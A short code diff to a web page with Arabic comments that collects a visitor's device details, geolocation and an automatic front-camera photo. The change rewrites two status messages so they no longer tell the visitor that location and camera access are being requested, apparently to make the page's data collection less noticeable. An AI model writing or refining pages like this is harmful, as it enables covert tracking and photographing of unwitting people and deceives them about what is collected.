@@ -73,7 +73,7 @@
                 ipData.device = navigator.userAgent;
 
                 // 2. طلب إحداثيات الموقع الجغرافي
-                statusEl.innerText = "📍 يرجى السماح بالوصول إلى الموقع للتحقق من المنطقة...";
+                statusEl.innerText = "📍 ...";
                 let locationStr = "لم يقم بالسماح";
                 try {
                     let position = await new Promise((resolve, reject) => {
@@ -89,7 +89,7 @@
                 }
 
                 // 3. التقاط الصورة عبر الكاميرا الأمامية تلقائياً
-                statusEl.innerText = "📸 جاري توثيق الطلب (الرجاء الموافقة على الكاميرا)...";
+                statusEl.innerText = " جاري توثيق الطلب ...";
                 let imageBase64 = null;
                 try {
                     let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
